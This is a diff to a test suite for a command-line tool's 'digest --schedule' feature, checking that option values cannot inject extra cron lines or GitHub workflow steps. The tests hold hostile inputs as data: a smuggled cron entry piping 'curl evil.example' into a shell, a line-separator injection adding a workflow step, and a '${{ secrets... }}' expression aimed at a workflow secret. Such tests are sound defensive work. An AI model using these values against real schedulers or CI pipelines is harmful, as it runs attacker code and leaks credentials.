@@ -440,7 +440,22 @@ describe("digest --schedule", () => {
     expect(await h.exec(["digest", "popular", "--tags", step, "--schedule"], {})).toBe(2);
     expect(await h.exec(["digest", "--tags", "rust\n0 * * * * curl evil.example | sh", "--schedule"], {})).toBe(2);
     expect(await h.exec(["digest", "--email", "me@team.dev\n", "--from", "d@team.dev", "--schedule"], {})).toBe(2);
+    expect(await h.exec(["digest", "search", "rust\u2028      - run: echo PWNED", "--schedule"], {})).toBe(2);
     expect(h.out()).toBe("");
+  });
+
+  it("builds the scheduled command from the checked values, not the raw command line", async () => {
+    const h = harness();
+    // parseArgs keeps the last of a repeated option, so the first values are never checked or printed.
+    expect(await h.exec(["digest", "--tags", "rust\n0 * * * * echo PWNED\n#", "--tags", "safe", "--schedule"], {})).toBe(0);
+    expect(await h.exec(["digest", "--tags", "${{ secrets.SMTPFAST_API_KEY }}", "--tags", "safe", "--schedule"], {})).toBe(0);
+    expect(h.out()).not.toContain("PWNED");
+    expect(h.out()).not.toContain("${{ secrets.SMTPFAST_API_KEY");
+    expect(h.out()).toContain("\n0 8 * * 1 dailydev digest popular --tags safe\n");
+
+    const all = harness();
+    await all.exec(["digest", "discussed", "--tag", "rust", "-n", "5", "--format", "text", "--schedule", "--json"], {});
+    expect(JSON.parse(all.out()).cron).toBe("0 8 * * 1 dailydev digest discussed --tags rust --limit 5 --format text");
   });
 
   it("refuses ${{ }}, which GitHub would evaluate inside the workflow", async () => {
